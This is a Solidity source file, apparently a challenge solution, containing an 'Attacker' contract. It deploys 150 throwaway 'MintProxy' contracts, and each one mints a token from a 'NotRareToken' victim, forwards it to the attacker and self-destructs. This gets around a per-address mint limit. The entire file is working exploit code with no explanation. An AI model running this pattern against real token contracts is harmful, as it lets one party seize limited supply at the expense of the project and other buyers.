// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

interface INotRareToken {
    function mint() external;
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract MintProxy {
    constructor(address notRareToken, address recipient, uint256 tokenId) {
        INotRareToken(notRareToken).mint();
        INotRareToken(notRareToken).transferFrom(address(this), recipient, tokenId);
        selfdestruct(payable(recipient));
    }
}

contract Attacker {
    constructor(address victim) {
        for (uint256 i = 0; i < 150; i++) {
            new MintProxy(victim, msg.sender, i + 1);
        }
    }
}